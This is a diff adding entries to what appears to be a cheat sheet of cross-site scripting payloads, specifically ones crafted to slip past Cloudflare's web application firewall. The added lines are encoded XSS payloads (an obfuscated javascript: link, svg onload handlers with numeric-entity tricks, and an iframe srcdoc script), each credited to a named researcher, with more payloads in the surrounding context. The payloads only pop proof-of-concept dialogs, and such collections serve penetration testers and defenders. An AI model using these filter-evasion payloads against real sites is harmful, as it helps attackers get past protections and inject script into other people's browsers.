@@ -2754,6 +2754,16 @@ http://host/ws/generic_api_call.pl?function=statns&standalone=%3c/script%3e%3csc
 ``` 
 
 ### Cloudflare
+- XSS Bypass by [@c0d3g33k](https://twitter.com/c0d3g33k)
+```
+<a+HREF='javascrip%26%239t:alert%26lpar;document.domain)'>test</a>
+```
+- XSS Bypasses by [@Bohdan Korzhynskyi](https://twitter.com/h1_ragnar)
+```
+<svg onload=prompt%26%230000000040document.domain)>
+<svg onload=prompt%26%23x000000028;document.domain)>
+xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
+```
 - XSS Bypass by [@RakeshMane10](https://twitter.com/rakeshmane10)
 ```
 <svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
